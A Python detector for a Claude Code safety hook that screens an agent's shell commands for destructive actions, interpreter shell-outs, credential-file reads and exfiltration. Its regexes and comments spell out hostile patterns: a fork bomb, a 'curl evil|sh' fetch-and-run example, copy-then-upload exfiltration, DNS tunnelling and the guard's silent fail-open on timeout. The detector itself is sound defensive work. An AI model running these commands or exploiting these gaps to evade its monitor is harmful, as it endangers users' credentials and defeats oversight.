#!/usr/bin/env python3
"""Unified safety detector — combines shell-wrapper, env-file, and exfiltration
detection in a single Python process. Called by safety.sh.

Reads CMD env var. Prints first-match reason on stdout, then exits.
Empty output = clean.
"""
from __future__ import annotations

import os
import re
import shlex
import sys
import threading
import time

# Self-imposed wall-clock cap, because the caller's cap does not exist on macOS.
#
# safety.sh wraps this in `gtimeout 0.5` / `timeout 0.5` and falls back to NO
# wrapper when neither is installed — which is the default macOS state, since
# `timeout` ships with GNU coreutils and macOS has neither. So the comment there
# promises a 500ms cap that, on a stock Mac, does not exist: this scanner runs
# unbounded and a pathological regex runs until Claude Code kills the whole hook.
# Measured on a real install: 12 safety.sh timeouts in 30 days, each burning the
# full 15s registered timeout and blocking the tool call behind it.
#
# A thread-based watchdog needs no external binary and works on every platform,
# unlike signal.SIGALRM which does not exist on Windows. os._exit(0) is abrupt on
# purpose: exit 0 with no output is exactly the fail-OPEN contract safety.sh
# already relies on (`|| PY_REASON=""`), so an overrun degrades to the regex
# verdict already computed above it rather than to a phantom deny.
#
# v4.0.11: the overrun is now RECORDED before the exit. Failing open is right and
# stays; being SILENT about it is what was wrong. When this fires, every check in
# this file disappears — and some rules live nowhere else, so the guard is simply
# gone. Measured 2026-09-01 by instrumenting safety.sh to keep the python exit
# code and stderr it normally sends to /dev/null:
#
#     bash -> python, 160 runs per level:  48-way 0, 64-way 1, 96-way 2 open
#     every captured failure:  rc=0  cats=[]  stderr=(empty)
#
# rc=0 with no stdout and no stderr has exactly one source here, since this
# command yields a finding 10 times out of 10 at the default budget: the timer
# below. Roughly 0.6% under heavy load, and invisible — safety.sh collapses every
# failure mode into `|| PY_REASON=""`, so a killed scanner and a clean scan look
# identical from the outside. That is the guard/oracle line: a guard may fail
# open quietly, but nothing was left to tell the user the deep scan did not run.
#
# The write is best-effort and swallows every error: this runs on the failure
# path of a security hook, and a broken state directory must never turn an
# overrun into a crash. One short O_APPEND line is atomic enough at this size.
_sc_emitted = threading.Event()


def _say(msg):
    """Emit a verdict, and mark that one was emitted.

    The watchdog runs on another thread and cannot see whether the main thread
    already answered. Without this flag the overrun counter recorded a miss on a
    run that HAD produced its verdict — measured while writing it: 0 of 20 runs
    silent, 1 overrun recorded. A counter that over-reports is the crying-wolf
    failure, so the flag is set before the write and the watchdog skips a run
    that already spoke.

    It does not close the race completely, and the measurement says so rather
    than the other way round. Forcing overruns with an absurd budget: at 1ms,
    2 of 40 scans killed against 4 recorded; at 0.2ms, 16 killed against 17.
    So it still over-reports by one or two in forty when the timer fires inside
    the emit path. That residue is only reachable at budgets three orders of
    magnitude below the 500ms default — at the real budget this file records
    nothing at all unless a scan genuinely died (verified at 0.5s, 20ms and 5ms:
    0 killed, 0 recorded). Read the count as "the deep scan was cut short at
    least this many times", never as an exact tally.
    """
    _sc_emitted.set()
    print(msg)


def _sc_note_overrun():
    if _sc_emitted.is_set():
        os._exit(0)
    try:
        _root = os.environ.get("SUPERCHARGER_STATE") or os.path.expanduser(
            "~/.claude/supercharger"
        )
        _scope = os.path.join(_root, "scope")
        os.makedirs(_scope, exist_ok=True)
        with open(os.path.join(_scope, ".detect-overruns"), "a") as _fh:
            _fh.write("%d %.3f\n" % (int(time.time()), _BUDGET_S))
    except Exception:
        pass
    os._exit(0)


_BUDGET_S = float(os.environ.get("SUPERCHARGER_DETECT_BUDGET_S", "0.5"))
if _BUDGET_S > 0:
    _wd = threading.Timer(_BUDGET_S, _sc_note_overrun)
    _wd.daemon = True
    _wd.start()

cmd = os.environ.get("CMD", "")
if not cmd:
    sys.exit(0)


# ──────────────────────────────────────────────────────────────────────────
# 1. Shell wrapper detection (python -c / node -e / perl -e / ruby -e / dash -c / ksh -c / fish -c)
# ──────────────────────────────────────────────────────────────────────────

_PATH_CONT = r"(?![/A-Za-z0-9._-])"
_DANGEROUS_TARGET = (
    r"(?:/" + _PATH_CONT
    + r"|/\*"
    + r"|~" + _PATH_CONT
    + r"|\$HOME"
    + r"|\.\." + _PATH_CONT
    + r")"
)
_WRAPPER_DESTRUCT = [
    r"rm\s+-[a-zA-Z]*[rR][a-zA-Z]*[fF]?\s+" + _DANGEROUS_TARGET,
    r"rm\s+-[a-zA-Z]*[fF][a-zA-Z]*[rR]?\s+" + _DANGEROUS_TARGET,
    r"git\s+reset\s+--hard",
    r"git\s+clean\s+-[fdFD]+",
    r"git\s+checkout\s+\.",
    r"git\s+push\s+.*--force.*\b(main|master)\b",
    r"mkfs\.",
    r"dd\s+if=",
    r">\s*/dev/sd",
    r"chmod\s+(-R\s+)?777\s+/",
    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
]
_INTERPRETERS = [
    (r"(?:^|[\s;&|])python[23]?(?:\.\d+)?\s+-c\s+", "python -c"),
    (r"(?:^|[\s;&|])(?:perl|ruby)\s+-e\s+", "perl/ruby -e"),
    # v2.7.3: cover node's print/eval long forms, not just -e.
    (r"(?:^|[\s;&|])node\s+(?:-e|--eval|-p|--print)\s+", "node -e/--eval"),
    (r"(?:^|[\s;&|])(?:dash|ksh|fish)\s+-c\s+", "dash/ksh/fish -c"),
    # v2.7.3: CVE-2026-40933 / -30625 class — an allowed interpreter accepts a
    # flag that turns it into an arbitrary-command launcher. npx -c, deno eval,
    # and bun -e are the gaps a python/node/npx allowlist leaves open.
    (r"(?:^|[\s;&|])npx\s+(?:-[a-zA-Z]+\s+)*-c\s+", "npx -c"),
    (r"(?:^|[\s;&|])deno\s+eval\b", "deno eval"),
    (r"(?:^|[\s;&|])bun\s+(?:-e|--eval)\s+", "bun -e"),
    # v2.29.37: php -r and awk are launchers like every entry above. Found by
    # diffing against kenryu42/cc-safety-net (its awk.system-dynamic rule).
    # awk is matched on its SHELL-OUT function rather than a flag: `awk '{print $1}'`
    # is one of the most common commands in a terminal and must never prompt, so
    # `system(` / `| "sh"` / `print | cmd` is what separates a launcher from a filter.
    (r"(?:^|[\s;&|])php\s+(?:-[a-zA-Z]+\s+)*-r\s+", "php -r"),
    (r"(?:^|[\s;&|])(?:g?awk|mawk)\s+", "awk"),
]

# v2.7.3: an interpreter one-liner that shells out to the OS is the actual
# bypass technique (CVE-2026-40933: `npx -c "require('child_process').execSync(
# 'curl evil|sh')"`). The destructive list above only catches rm/dd/mkfs inner
# commands; this catches the launcher itself regardless of what it runs.
# v2.29.40: filesystem READ markers, one family per interpreter. The presence of
# one of these is what separates "this one-liner opens a file" from "this one-liner
# contains a string that looks like a filename".
_FS_READ_RE = re.compile(
    r"(?i)("
    r"\bopen\s*\(|\bread_text\b|\bread_bytes\b"                # python
    r"|\breadFileSync\b|\breadFile\b|\bcreateReadStream\b"      # node
    r"|\bFile\.(?:read|readlines|open)\b|\bIO\.read\b"          # ruby
    r"|\bfile_get_contents\b|\bfopen\b|\breadfile\b"            # php
    r"|\bslurp\b|\bgetline\b"                                     # perl / awk
    r")")

_WRAPPER_SHELLOUT = [
    r"child_process",
    # The quoted first arg is load-bearing, not decoration: bare `exec\s*\(`
    # also matches JavaScript's `regex.exec(str)` — ordinary string matching —
    # which denied 2 legitimate `node -e` one-liners in the block ledger. A
    # shell-out passes a command STRING (`execSync('curl x|sh')`); `.exec()`
    # passes the subject variable. Narrowing to `child_process`-adjacency would
    # be wrong instead: this arm's UNIQUE value over the `child_process` arm
    # above is the concatenation evasion `require('child'+'_process').execSync(`,
    # where that literal never appears. Both are covered by tests.
    r"\b(?:exec|spawn|execFile)(?:Sync)?\s*\(\s*['\"]",
    r"\bos\.system\b",
    # v2.29.37: php's equivalents. shell_exec/passthru/proc_open all hand a STRING
    # to the OS, exactly like os.system and execSync above.
    r"\bshell_exec\s*\(",
    # v2.29.37: awk's and php's `system("cmd")`. The QUOTED argument is load-bearing
    # for the same reason it is on the exec arm above: a shell-out passes a command
    # STRING, while `system(cfg)` passes a variable and is ordinary code. Without the
    # quote this would match any language's system() call in any pasted snippet.
    # Verified: `gawk 'BEGIN{system("id")}'` blocks, `awk '{print $1}' log` does not.
    r"\bsystem\s*\(\s*['\"]",
    r"\b(?:passthru|proc_open|popen)\s*\(",
    r"\bos\.popen\b",
    # v2.22.8: catch aliased / indirect os shellout — `import os as o; o.system(`,
    # `__import__('os').system(`, `getattr(os,'system')(`. The `\bos\.system\b`
    # and the bare-`system(` patterns missed a dot-prefixed alias.
    r"\.(?:system|popen)\s*\(",
    r"getattr\s*\([^)]*['\"](?:system|popen|call|run|Popen|check_output)['\"]",
    r"\bsubprocess\.(?:Popen|run|call|check_output|check_call|getoutput)\b",
    r"\bDeno\.(?:run|Command)\b",
    r"(?:^|[^\w.])system\s*\(",
]


def check_shell_wrapper(c: str) -> str | None:
    for wrap_re, label in _INTERPRETERS:
        m = re.search(wrap_re, c)
        if not m:
            continue
        inner = c[m.end():]
        if inner and inner[0] in ("'", '"'):
            inner = inner[1:]
        for p in _WRAPPER_DESTRUCT:
            if re.search(p, inner, re.IGNORECASE):
                return f"destructive command hidden in {label} wrapper"
        for p in _WRAPPER_SHELLOUT:
            if re.search(p, inner):
                return f"OS shell-out hidden in {label} wrapper"
        # v2.29.40: a credential file read from INSIDE the code string. Every rule
        # for sensitive paths keys on a shell READER beside the path (cat/head/
        # grep), and an interpreter one-liner has none -- the read is a function
        # call. Measured: `cat` on a dotenv or an aws credentials file was denied
        # while the python, node, ruby, perl and php equivalents all passed.
        #
        # The FILESYSTEM MARKER is required, not merely the path. Matching a path
        # literal alone would fire on any one-liner that happens to mention
        # something like config.key -- the same over-match that made `.keys()` a
        # false positive before the group terminator was added. Borrowed from
        # kenryu42/cc-safety-net, which treats an inline path as data only when the
        # surrounding code carries no filesystem or execution marker.
        if _FS_READ_RE.search(inner) and _SENSITIVE_NAME_RE.search(inner):
            return f"credential file read from inside a {label} code string"
    return None


# ──────────────────────────────────────────────────────────────────────────
# 2. .env file access detection
# ──────────────────────────────────────────────────────────────────────────

_ENV_FILE_RE = r"(^|[\s/=\'\"])\.env(\.[a-zA-Z0-9_-]+)?(?=[\s\'\")\]]|$)"
_SAFE_TEMPLATES = (".env.example", ".env.template", ".env.sample", ".env.dist")

# Extended sensitive file/dir patterns (claudekit-inspired)
_SENSITIVE_NAME_RE = re.compile(
    r"(?i)(?:"
    # `(?:rc)?` is not decoration: `.envrc` (direnv, holds secrets) only ever matched
    # because the pattern was unbounded, so adding the terminator below without this
    # would silently DROP that file from the sensitive set.
    # v2.26.65: `process.env` / `import.meta.env` are property accesses, not files, and
    # any command mentioning one (`grep -rn "process.env" src/`) was denied as
    # "sensitive file access". Excluded by name rather than by a left boundary: a
    # general `(?<!\w)` here reads well and is WRONG, because it also stops matching
    # `prod.env`, `backup.env`, `staging.env` — real credential files whose names are
    # syntactically identical to the idioms. Measured: the boundary version cleared the
    # two FPs and silently allowed three of those. Only the idioms are excluded.
    r"(?<!process)(?<!meta)\.env(?:rc)?(?:\.[a-zA-Z0-9_-]+)?"
    r"|\.npmrc|\.pypirc|\.pgpass|\.my\.cnf|\.netrc|\.authinfo(?:\.gpg)?|\.git-credentials"
    # v2.9.17: registry / package-manager credential stores (from efij Stallion)
    r"|\.docker/config\.json|\.cargo/credentials(?:\.toml)?|\.gem/credentials|(?:^|[/\s])pip\.conf"
    # v2.29.37: ~/.aws/credentials was NOT here. The gate lists *aws* so the detector
    # ran, then matched nothing -- every reader allowed it while the Read channel
    # blocked it. Cross-channel drift in the direction the first probe did not test.
    r"|\.aws/credentials"
    # Credential stores with distinctive extensions: a password database and a Java
    # keystore are never anything else, so the extension alone is safe to match.
    r"|[\w.*-]+\.(?:kdbx|keystore)"
    # PATH-scoped, deliberately. hosts.yml / auth.json / config.json are generic
    # names -- matching them by basename would fire on ordinary project files. The
    # secret is the LOCATION, so that is what the pattern requires.
    r"|\.config/gh/hosts\.yml|\.claude\.json|\.codex/auth\.json|\.cursor/config\.json"
    # v2.10.4: kubeconfig read parity — Read channel bypassed the Bash guard
    r"|\.kube/config|(?:^|/)kubeconfig(?![\w.-])"
    r"|id_rsa[a-zA-Z0-9_.-]*|id_dsa[a-zA-Z0-9_.-]*|id_ecdsa[a-zA-Z0-9_.-]*|id_ed25519[a-zA-Z0-9_.-]*"
    r"|[\w.*-]+\.(?:ppk|pem|key|crt|cer|p12|pfx)"
    r"|wallet\.dat|wallet\.json|[\w.*-]+\.wallet"
    # v4.0.20: the extension is a STORE format, not anything at all. `secrets?\.`
    # followed by `[a-zA-Z0-9_-]+` matched every file whose name merely mentions
    # secrets — a script, a module, a doc — and a property access besides.
    # Measured over 33,975 distinct real commands, the rule matched 10 distinct
    # strings:
    #
    #     still matched  credentials.cfg  credentials.json  credentials.toml
    #                    secrets.json     secrets.yaml      secrets.yml
    #     dropped        Secret.length    secret.py   secrets.py   secrets.sh
    #
    # Every dropped one is code, docs, or an attribute lookup; every kept one is a
    # credential store.
    #
    # The list came from the corpus and was WRONG, and the suite caught it: gcloud
    # keeps `credentials.db` (sqlite), which appears in none of those 33,975
    # commands and in six existing assertions. "Zero losses" was true of the
    # corpus and false of the product. A corpus measures what someone HAPPENS TO
    # RUN; the tests encode what the guard must COVER, and only the second is the
    # contract. db/sqlite/tokens/dat/keyring/store/p12/jks are here for that
    # reason, not because anything in the corpus needed them.
    #
    # The objection worth answering: a Python project CAN put `API_KEY = "..."` in
    # a secrets.py. Reading it is still guarded — the NAME rule is a coarse proxy,
    # the CONTENT scan is the precise check, and it is unchanged. Verified:
    # output-secrets-scanner on a secrets.py carrying real keys fires
    # (pattern 0,3,5 of 28); on one carrying none, it stays silent.
    r"|secrets?\.(?:json|ya?ml|toml|ini|cfg|conf|env|properties|txt|enc|age|gpg|asc|vault|tfvars|db|sqlite3?|tokens?|dat|keyring|store|p12|jks)(?![a-zA-Z0-9_-])"
    r"|credentials\.(?:json|ya?ml|toml|ini|cfg|conf|env|properties|txt|enc|age|gpg|asc|vault|tfvars|db|sqlite3?|tokens?|dat|keyring|store|p12|jks)(?![a-zA-Z0-9_-])"
    # v2.10.1: terraform var files (DB passwords / cloud creds / API keys) +
    # token stores (from chuckreynolds/claude-secret-guardrails)
    r"|[\w.*-]*\.tfvars|[\w.*-]*\.tokens\.json"
    # v2.25.3: ONE terminator for the whole group. Nearly every alternative here was
    # unbounded, so each matched inside a longer identifier and any reader command
    # (cat/grep/head/sed/awk) whose arguments contained one was denied as "sensitive
    # file access". Measured: 13 of 13 realistic samples wrongly matched —
    #   Object.keys(cfg) -> Object.key    obj.keys()      -> obj.key
    #   cfg.certificate  -> cfg.cer       x.pemberton     -> x.pem
    #   row.keyword      -> row.key       data.walletsize -> data.wallet
    # `.keys()` alone is ubiquitous in Python and JavaScript.
    #
    # v2.25.2 fixed only the `.env` arm and checked the other `.env` SITES, not the
    # other ALTERNATIVES — so it left twelve of these in place. Applying the boundary
    # to the group instead of arm-by-arm is what makes that mistake unrepeatable.
    #
    # A non-word char still terminates, so real names survive: `cert.pem.bak` (dot),
    # `.env-local` (hyphen), `server.key"` (quote), `id_ed25519` (end).
    r")(?!\w)"
)


# v2.26.68: tools whose FIRST non-flag operand is a pattern/script, not a path.
# `grep -rn "config.key" src/` was denied as "sensitive file access: config.key",
# because the search pattern was scanned as if it named a file. Same class as the
# `process.env` fix in v2.26.65 — and found by auditing the OTHER ARMS of that same
# regex, which that fix did not do. `.key`, `.cer` and `.pem` are ordinary property
# names, so the arm matched `config.key`, `tls.cer`, and so on.
#
# Fixed by syntax rather than by another name list: for these tools the first operand
# is defined by the tool's own grammar to be a pattern, so dropping it is exact and
# does not need to guess. Crucially it is NOT a general "ignore quoted text" rule —
# `grep -rn foo "secrets.json"` still denies, because there the first operand is the
# pattern `foo` and the sensitive name is a genuine FILE argument.
_PATTERN_READERS = {"grep", "egrep", "fgrep", "rg", "ag", "ack", "sed", "awk", "gawk"}


def _drop_first_operand(args: str) -> str:
    """Remove the leading non-flag token (the pattern/script) from an arg string."""
    try:
        toks = shlex.split(args)
    except ValueError:
        # Unbalanced quotes: scan the args untouched. Failing toward MORE scanning is
        # the only safe direction here — dropping tokens we failed to parse would
        # hide real filenames.
        return args
    out, dropped = [], False
    for t in toks:
        if not dropped and not t.startswith("-"):
            dropped = True
            continue
        out.append(t)
    return " ".join(out)


def check_sensitive_read(c: str) -> str | None:
    """Block direct reader/editor commands targeting sensitive files."""
    # Skip safe metadata commits/PRs that may mention sensitive names in text
    if re.match(r"^\s*(git\s+commit|git\s+tag|gh\s+(pr|issue|release)\s+create)\b", c):
        return None

    # Reader/editor commands followed by a sensitive filename token.
    # base64/gzip/bzip2/xz/zstd/uuencode sit here with xxd and od because they
    # are the same act: read the credential and emit it transformed. xxd and od
    # were covered and these were not -- one arm of a sibling pair, which is the
    # gap class this repo keeps finding. Measured: `base64 <key>` and
    # `gzip -c <key>` were both silent while `xxd <key>` and `od -c <key>` denied.
    READER = r"\b(?P<tool>cat|less|more|head|tail|bat|nano|vim?|emacs|code|subl|atom|gedit|grep|egrep|fgrep|rg|ag|ack|awk|gawk|sed|tee|xxd|hexdump|od|base64|uuencode|gzip|bzip2|xz|zstd)\b"
    # Capture the args of a reader command and search for sensitive names within
    for m in re.finditer(READER + r"\s+([\S\s]*?)(?:$|\||;|&&|\|\|)", c):
        args = m.group(2)
        if m.group("tool") in _PATTERN_READERS:
            args = _drop_first_operand(args)
        sm = _SENSITIVE_NAME_RE.search(args)
        if sm:
            # A PUBLIC key matches only because it contains the private
            # key's name. Reading one is what a public key is FOR:
            # authorized_keys, a deploy-key field, a ticket. Denying it is
            # over-blocking, and it trains people to switch the guard off.
            # Only the exact suffix is skipped; the private key beside it
            # is unaffected.
            if not sm.group(0).endswith(".pub"):
                return f"sensitive file access: {sm.group(0)} — credentials likely present"
    return None


# Relocation and encoding verbs. The reader list above covers commands that put a
# credential on STDOUT; these put it somewhere else under a new name, which is the
# setup step of a two-command exfil: copy the secret to an innocuous path, then
# upload that path. Neither command alone carries the signature -- measured before
# this was written: `cp <cred> /tmp/notes.txt` followed by
# `curl --data @/tmp/notes.txt` passed every guard, while the single-command form
# `curl -T <cred>` was denied.
_RELOCATE_RE = re.compile(
    r"(?:^|[;&|]|\s)(?:cp|mv|install|rsync|scp)\b(?P<args>[^|;&]*)", re.I)
# Encoders that read a credential and emit it transformed, hiding the name.
_ENCODE_RE = re.compile(
    r"(?:^|[;&|]|\s)(?:base64|xxd|uuencode|gzip|bzip2|xz|zstd)\b(?P<args>[^|;&]*)", re.I)


def check_credential_laundering(c: str) -> str | None:
    """A sensitive file copied or encoded to a NON-sensitive name.

    The discriminator is deliberately narrow: it is the change of IDENTITY that
    matters, not the copy. `cp ../repo/.env ../repo-b/.env` keeps the name, stays
    protected by the reader rule, and is ordinary work -- it appears 7 times in
    this project's own transcripts and must not fire. `cp <cred> /tmp/notes.txt`
    produces a file nothing downstream will recognise as a secret.

    Measured on that corpus: 4/4 laundering shapes flagged, 0/4 routine copies
    (including .env -> .env in a fresh worktree, and .env.example -> .env).
    """
    for rx in (_RELOCATE_RE, _ENCODE_RE):
        for m in rx.finditer(c):
            args = [a for a in m.group("args").split() if not a.startswith("-")]
            if not args:
                continue
            src = args[0]
            # A PUBLIC key is meant to be copied — deploy keys, authorized_keys,
            # pasting one into a form. It matches the sensitive-name pattern only
            # because it contains the private key's name. The reader rule already
            # over-blocks these (pre-existing); do not widen that to copies too.
            if re.search(r"\.pub($|[\s'\"])", src):
                continue
            sm = _SENSITIVE_NAME_RE.search(src)
            if not sm:
                continue
            # An encoder with no destination writes to stdout; the pipeline and
            # exfil checks own that case, so only a redirect or second operand
            # counts as laundering here.
            if len(args) < 2:
                continue
            if _SENSITIVE_NAME_RE.search(args[-1]):
                continue        # destination keeps the identity -- still guarded
            return (f"credential laundering: {sm.group(0)} copied to a "
                    f"non-sensitive name ({args[-1]}) — the setup step of a "
                    f"two-command exfil")
    return None


# Directories whose contents are secret by LOCATION rather than by name. The
# filename patterns above protect id_rsa and friends; a deploy key called
# `github_ci` sitting beside it was completely unguarded, and custom key names
# are ordinary practice.
_SECRET_DIRS = ("/.ssh/", "/.gnupg/", "/.aws/")
# Members of those directories that are NOT secrets and are read routinely. A
# blanket directory rule without this list denies `cat ~/.ssh/config`, which is
# how a guard earns a reputation for crying wolf and gets switched off.
_SECRET_DIR_PUBLIC = re.compile(
    r"(?:^|/)(?:known_hosts(?:\.old)?|config|authorized_keys(?:2)?|"
    r"environment|rc|pubring\.[a-z]+|trustdb\.gpg|\S*\.pub)$", re.I)


def check_secret_directory(c: str) -> str | None:
    """A read of a file inside a secret directory, whatever it is called."""
    for m in re.finditer(r"(?:^|[\s'\"=])((?:[\w.~/-]*)?(?:/\.ssh/|/\.gnupg/|/\.aws/)[\w.-]+)", c):
        path = m.group(1)
        if _SECRET_DIR_PUBLIC.search(path):
            continue
        # Already reported by the filename rules — do not double-report.
        if _SENSITIVE_NAME_RE.search(path):
            continue
        return (f"secret directory access: {path} — files under "
                f".ssh/.gnupg/.aws are credentials regardless of their name")
    return None


# Archive creation: tar with a `c` mode, or zip. Extraction is deliberately NOT
# matched -- `tar xzf` is ordinary work and denying it would be pure friction.
_ARCHIVE_CREATE_RE = re.compile(
    r"(?:^|[;&|]|\s)(?:tar\s+(?:-{0,2}[a-zA-Z-]*c[a-zA-Z-]*)|zip\b|7z\s+a)\b(?P<args>[^|;&]*)",
    re.I)


def check_archive_secrets(c: str) -> str | None:
    """An archive being built that includes a secret directory or file."""
    for m in _ARCHIVE_CREATE_RE.finditer(c):
        for arg in m.group("args").split():
            if arg.startswith("-"):
                continue
            bare = arg.rstrip("/")
            # The archive's own name is an operand too; it is the destination,
            # not a secret, and it is excluded by the same public list.
            if _SECRET_DIR_PUBLIC.search(bare):
                continue
            hit = None
            if any(bare.endswith(d.rstrip("/")) or (d in arg) for d in _SECRET_DIRS):
                hit = bare
            elif _SENSITIVE_NAME_RE.search(arg):
                hit = _SENSITIVE_NAME_RE.search(arg).group(0)
            if hit:
                return (f"archiving secrets: {hit} — an archive puts every key "
                        f"in one file under a name nothing downstream recognises")
    return None


def check_pipeline_bypass(c: str) -> str | None:
    """Detect pipeline-based bypasses of direct file-read protections.

    Patterns:
      echo|printf <SENSITIVE> | xargs cat
      find ... -name <SENSITIVE> | xargs cat
      find ... -name <SENSITIVE> -exec cat {} \\;
      ls <SENSITIVE> | xargs cat
    """
    # echo/printf <SENSITIVE> | ... | xargs cat
    for m in re.finditer(r"\b(?:echo|printf|ls)\b\s+([\"\']?[\w./*-]+[\"\']?)", c):
        arg = m.group(1).strip("'\"")
        if not _SENSITIVE_NAME_RE.search(arg):
            continue
        tail = c[m.end():]
        if re.search(r"\|[\s\S]*?\bxargs\b[\s\S]*?\bcat\b", tail):
            return f"pipeline bypass: {m.group(0).strip()} | xargs cat — sensitive file exfiltration"
        if re.search(r"\|[\s\S]*?\b(cat|less|more|head|tail|nc|netcat|curl|wget)\b", tail):
            return f"pipeline bypass: piping sensitive name into reader/network tool"

    # find ... -name/-iname/-regex SENSITIVE ... | xargs cat OR -exec cat
    find_re = re.compile(
        r"\bfind\b[\s\S]*?-(?:name|iname|regex|iregex)\s+(?:\"([^\"]+)\"|'([^']+)'|(\S+))",
        re.IGNORECASE,
    )
    for m in find_re.finditer(c):
        pat = m.group(1) or m.group(2) or m.group(3) or ""
        if not _SENSITIVE_NAME_RE.search(pat):
            continue
        # Check if find result is piped to a reader or used in -exec cat
        find_tail = c[m.start():]
        if re.search(r"-exec\s+(cat|less|more|head|tail|nc|netcat|curl|wget)\b", find_tail):
            return f"find bypass: -exec reader on sensitive pattern '{pat}'"
        if re.search(r"\|[\s\S]*?\b(xargs|cat|less|more|head|tail|nc|netcat|curl|wget)\b", find_tail):
            return f"find bypass: piping sensitive results to reader/network tool ('{pat}')"
    return None
_ENV_READ_WRITE_PREFIXES = [
    r"\b(cat|less|more|head|tail|bat)\s+",
    r"\b(nano|vim?|emacs|code|subl|atom|gedit)\s+",
    r"\b(cp|mv|scp|rsync)\s+",
    r"\bgrep\s+",
    r"\bawk\s+",
    r"\bsed\s+",
    r"\btee\s+",
    r"\b(curl|wget)\s+.*\s-o\s+",
]
_ENV_SELF_CONTAINED = [
    r">\s*\.env\b",
    r">>\s*\.env\b",
]


def check_env_file(c: str) -> str | None:
    # Allow safe metadata commits/PRs that mention .env in text only
    if re.match(r"^\s*(git\s+commit|git\s+tag|gh\s+(pr|issue|release)\s+create)\b", c):
        return None

    flagged = []
    for m in re.finditer(_ENV_FILE_RE, c):
        token = re.search(r"\.env(\.[a-zA-Z0-9_-]+)?", c[m.start():m.end()])
        if not token:
            continue
        name = token.group(0)
        if name in _SAFE_TEMPLATES:
            continue
        flagged.append(name)

    if not flagged:
        return None

    for pat in _ENV_READ_WRITE_PREFIXES:
        if re.search(pat + r".*\.env\b", c, re.IGNORECASE):
            return f".env file access ({flagged[0]}) — credentials likely present"
    for pat in _ENV_SELF_CONTAINED:
        if re.search(pat, c, re.IGNORECASE):
            return f".env file access ({flagged[0]}) — credentials likely present"
    return None


# ──────────────────────────────────────────────────────────────────────────
# 3. Data exfiltration detection (DNS tunnels + cloud upload of secrets)
# ──────────────────────────────────────────────────────────────────────────

_DNS_EXFIL_TOOLS = [
    r"\bdnscat2?\b",
    r"\biodined?\b",
    r"\bdns2tcp\b",
    r"\bdnsexfil\b",
]
_SENSITIVE_PATHS = [
    r"\.env\b(?!\.example|\.template|\.sample|\.dist)",
    r"~/\.ssh\b|/\.ssh/",
    r"~/\.aws\b|/\.aws/",
    r"~/\.gnupg\b",
    r"/etc/shadow\b",
    r"/etc/passwd\b",
    r"/etc/sudoers\b",
    r"\.pem\b",
    r"id_rsa\b|id_ed25519\b|id_ecdsa\b",
    r"\.kube/config\b",
    r"\.npmrc\b",
    r"\.pgpass\b",
    r"credentials\b",
]
_CLOUD_UPLOADS = [
    (r"\baws\s+s3\s+(cp|mv|sync)\b", "aws s3 upload"),
    (r"\bgsutil\s+(cp|mv|rsync)\b", "gsutil upload"),
    (r"\baz\s+storage\s+(blob|file)\s+upload\b", "az storage upload"),
    (r"\bazcopy\s+copy\b", "azcopy upload"),
    (r"\brclone\s+(copy|sync|move)\b", "rclone upload"),
    (r"\bs3cmd\s+put\b", "s3cmd upload"),
]
_NETWORK_UPLOADS = [
    r"\bcurl\b.*(?:--data-binary|--data-raw|--data-urlencode|--data\b|-d\s"
    r"|--upload-file|-T\s|-F\s|--form\b)",
    r"\bwget\b.*--post-file=",
    r"\bnc\b.*(?:-c|<|<<)",
    r"\bnetcat\b.*(?:-c|<|<<)",
    # v2.9.9: scp/rsync to a REMOTE host (host:path syntax). check_env_file
    # already covers `scp .env host:`, but a sensitive NON-.env file (id_rsa,
    # .pem, .aws/credentials) copied out slipped through — scp/rsync weren't an
    # exfil channel. Gated on _SENSITIVE_PATHS below, so `scp README host:` is
    # untouched. (from mafiaguy/claude-security-guardrails)
    r"\bscp\b[^|;&]*\s\S+:",
    r"\brsync\b[^|;&]*\s\S+:",
]


# v2.9.16: DNS-as-channel via a normal resolver tool (dig/nslookup/host/drill) —
# only when paired with an encoding/secret payload, so plain `dig example.com`
# stays allowed. (from efij Stallion)
_DNS_RESOLVER_TOOLS = r"(?:^|[\s;&|])(?:dig|nslookup|host|drill)\b"
_DNS_EXFIL_PAYLOAD = r"(?:base64|base32|xxd|openssl\s+enc|\$\((?:cat|printenv|env|whoami|hostname)|\.env\b|id_rsa)"


def check_exfiltration(c: str) -> str | None:
    for pat in _DNS_EXFIL_TOOLS:
        if re.search(pat, c):
            return "DNS tunneling tool detected — used for covert data exfiltration"

    if re.search(_DNS_RESOLVER_TOOLS, c) and re.search(_DNS_EXFIL_PAYLOAD, c):
        return "DNS resolver with an encoded/secret payload — possible DNS exfiltration"

    for upload_re, label in _CLOUD_UPLOADS:
        if not re.search(upload_re, c):
            continue
        for sens in _SENSITIVE_PATHS:
            if re.search(sens, c):
                return f"{label} of sensitive source — possible credential/key exfiltration"

    for upload_re in _NETWORK_UPLOADS:
        if not re.search(upload_re, c):
            continue
        for sens in _SENSITIVE_PATHS:
            if re.search(sens, c):
                return "network upload of sensitive source — possible credential exfiltration"
    return None


# ──────────────────────────────────────────────────────────────────────────
# Main: run checks in order, first match wins. Categories may be disabled
# via $DISABLED_CATS (newline-separated, from
# ~/.claude/supercharger/scope/.disabled-security-categories).
# Categories: shell_wrapper, env_files, exfiltration
# ──────────────────────────────────────────────────────────────────────────

disabled = set((os.environ.get("DISABLED_CATS", "") or "").split())

if "shell_wrapper" not in disabled:
    r = check_shell_wrapper(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "env_files" not in disabled:
    r = check_env_file(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "sensitive_read" not in disabled:
    r = check_sensitive_read(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "credential_laundering" not in disabled:
    r = check_credential_laundering(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "secret_directory" not in disabled:
    r = check_secret_directory(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "archive_secrets" not in disabled:
    r = check_archive_secrets(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "pipeline_bypass" not in disabled:
    r = check_pipeline_bypass(cmd)
    if r:
        _say(r)
        sys.exit(0)

if "exfiltration" not in disabled:
    r = check_exfiltration(cmd)
    if r:
        _say(r)
        sys.exit(0)
